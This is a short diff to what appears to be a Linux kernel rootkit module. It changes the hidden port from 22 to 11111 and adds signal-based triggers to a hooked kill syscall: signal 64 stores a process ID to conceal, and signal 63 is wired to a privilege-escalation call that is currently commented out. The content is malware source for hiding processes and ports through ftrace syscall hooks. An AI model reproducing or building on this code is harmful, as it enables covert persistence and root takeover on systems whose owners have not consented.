@@ -16,9 +16,11 @@
 #define PREFIX "wdb"
 
 /* port to hide */
-#define PORT 22
+#define PORT 11111
+
 
 char hidden_pid[32];
+
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("otitoko");
@@ -48,6 +50,10 @@ static asmlinkage int hook_kill(const struct pt_regs *regs){
 
 	if(sig==64){
 		sprintf(hidden_pid, "%d%",pid);
+		return 0;
+			}
+	else if(sig==63){
+	//	set_root();
 		return 0;
 	}
 	return orig_kill(regs);
@@ -137,6 +143,7 @@ static struct ftrace_hook hooks[] = {
 	HOOK("__x64_sys_kill",hook_kill,&orig_kill),
 };
 static int __init basic_init(void){
+
 
 	int err;
 	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
